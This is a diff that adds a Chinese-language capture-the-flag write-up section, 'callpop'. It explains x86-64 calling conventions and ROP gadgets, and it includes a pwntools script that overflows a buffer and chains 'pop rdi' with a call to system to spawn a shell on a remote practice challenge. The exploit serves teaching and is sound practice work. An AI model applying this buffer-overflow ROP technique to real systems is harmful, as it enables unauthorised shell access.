@@ -111,3 +111,30 @@ r.recvline()
 r.sendline(playload)
 r.interactive()
 ```
+
+## callpop
+![call](images/call1.webp)
+![call](images/call2.webp)
+做这题我们需要先了解一下`call`和`pop`，`call`顾名思义就是“打电话”把函数叫过来执行--跳转到目标地址，遇到ret返回，通常用于函数调用。而`pop`是指将栈顶即rsp寄存器指向的内容弹进目标寄存器内。
+同时我们还需要知道在64位系统中使用寄存器来传参，并且在linux系统中寄存器是有顺序的，按顺序是rdi，rsi，rdx，rcx，r8，r9，如果还有多余参数再传到栈中。
+现在我们再来看题目，mian函数的内容还是和之前一样的，但是vuln没有`/bin/sh`了，这时候我们在ida里用shift+F12显示程序中所有字符串
+![call](images/call3.webp)发现是有的，于是我们再用ROPgadget查找`/bin/sh`的地址
+![call](images/call4.webp)
+那我们如何让system执行`/bin/sh`，而不是`ls`呢？再来ida里分析
+![call](images/call5.webp)
+这里的意思是command(*也就是`ls`*)被leave进了rdi里，之后call了(也就是调用了)system。于是我们可以想到在调用之前如果我们把`/bin/sh`的地址放进system(*ida里可以看到在在0x4011A5处*)里面，相当于自己造了一个`system('/bin/sh')`，那不就可以拿到shell了吗！
+那具体怎么操作呢？这里就需要用到`pop`了，再使用一下ROPgadget查找`pop rdi`的地址，发现在0x40125B处。现在我们只需要根据上述的思路按照调用的顺序写exp就行了
+
+```python
+from pwn import *
+context(arch='amd64', os='linux',log_level='debug')
+r = remote('node6.anna.nssctf.cn', 26072)
+system = 0x4011A5
+poprdi = 0x40125B
+binsh = 0x404048
+playload = b'a'*0x48+p64(poprdi)+p64(binsh)+p64(system)
+r.recvline()
+#gdb.attach(r)
+r.sendline(playload)
+r.interactive()
+```
